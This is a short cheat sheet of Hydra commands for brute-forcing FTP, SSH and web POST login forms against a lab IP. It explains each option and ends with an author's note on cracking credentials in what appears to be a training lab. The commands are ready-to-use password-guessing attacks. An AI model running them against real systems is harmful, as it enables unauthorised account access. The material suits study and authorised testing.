# Hydra Commands

## FTP 
`hydra -l user -P passlist.txt ftp://10.10.71.146`

## SSH

`hydra -l <username> -P <full path to pass> 10.10.71.146 -t 4 ssh`

Option 	Description
* -l 	specifies the (SSH) username for login
* -P 	indicates a list of passwords
* -t 	sets the number of threads to spawn

For example, hydra -l root -P passwords.txt 10.10.71.146 -t 4 ssh will run with the following arguments:

    Hydra will use root as the username for ssh
    It will try the passwords in the passwords.txt file
    There will be four threads running in parallel as indicated by -t 4

## Post Web Form

We can use Hydra to brute force web forms too. You must know which type of request it is making; GET or POST methods are commonly used. You can use your browserâ€™s network tab (in developer tools) to see the request types or view the source code.

`sudo hydra <username> <wordlist> 10.10.71.146 http-post-form "<path>:<login_credentials>:<invalid_response>"`

Option 	Description
* -l 	the username for (web form) login
* -P 	the password list to use
* http-post-form 	the type of the form is POST
* <path> 	the login page URL, for example, login.php
* <login_credentials> 	the username and password used to log in, for example, username=^USER^&password=^PASS^
* <invalid_response> 	part of the response when the login fails
* -V 	verbose output for every attempt

Below is a more concrete example Hydra command to brute force a POST login form:

`hydra -l <username> -P <wordlist> 10.10.71.146 http-post-form "/:username=^USER^&password=^PASS^:F=incorrect" -V`

* The login page is only /, i.e., the main IP address.
* The username is the form field where the username is entered
* The specified username(s) will replace ^USER^
* The password is the form field where the password is entered
* The provided passwords will be replacing ^PASS^
* Finally, F=incorrect is a string that appears in the server reply when the login fails


Hydra. I think I used Hydra multiple times like sqlmap. This is a very handy tool. I used Hydra for FTP and SSH cracking. You will get the Username/Password file in the Lab and you will only have to use Hydra and these files to crack FTP/SSH. I had to check for NFS port on some IP and after that I used Hydra. After finding valid credentials I found the .txt file which I was told to find.
